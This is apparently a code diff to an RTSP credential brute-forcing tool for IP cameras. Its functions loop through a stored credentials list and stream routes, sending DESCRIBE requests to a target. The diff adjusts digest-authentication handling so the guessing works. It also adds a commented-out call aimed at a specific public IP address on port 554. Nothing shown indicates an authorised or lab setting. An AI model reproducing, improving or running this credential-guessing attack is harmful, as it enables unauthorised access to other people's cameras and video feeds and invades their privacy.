@@ -40,7 +40,7 @@ def attackRoutesWithCreds(target, username, password, port, authmethod):
             else:
                 describeURL = "rtsp://{}:{}@{}:{}/{}".format(username, password, target, port, route)
 
-            s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ah.authBuilder(authmethod, receivedBuffer, username, password)))
+            s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ah.authBuilder(authmethod, receivedBuffer, username, password, "/{}".format(route))))
             tmpDescribeRecv = s.recv(ah.configJson["bufLen"]).decode()
             seq += 1
             if "RTSP/1.0 200" in tmpDescribeRecv:
@@ -64,7 +64,7 @@ def attackCredentials(target, port, authmethod):
         s.connect((target,port))
 
         describeURL = "rtsp://{}:{}{}".format(target, port, "/sdekfjvhejkhrv")
-        s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ah.authBuilder(authmethod, receivedBuffer, "", "")))
+        s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ah.authBuilder(authmethod, receivedBuffer, "", "", "/sdekfjvhejkhrv")))
         receivedBuffer = s.recv(ah.configJson["bufLen"]).decode()
 
         with open(os.path.join(os.path.dirname(__file__), 'resources\\creds.json'), 'r') as f:
@@ -78,7 +78,7 @@ def attackCredentials(target, port, authmethod):
                     # print(receivedBuffer)
                     seq += 1
 
-                s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ah.authBuilder(authmethod, receivedBuffer, username, password)))
+                s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ah.authBuilder(authmethod, receivedBuffer, username, password, "/")))
                 tmpDescribeRecv = s.recv(ah.configJson["bufLen"]).decode()
                 seq += 1
                 # print(tmpDescribeRecv)
@@ -87,3 +87,5 @@ def attackCredentials(target, port, authmethod):
                     attackRoutesWithCreds(target, username, password, port, authmethod)
     except:
         pass
+
+# attackCredentials("79.129.152.137", 554, "digest")
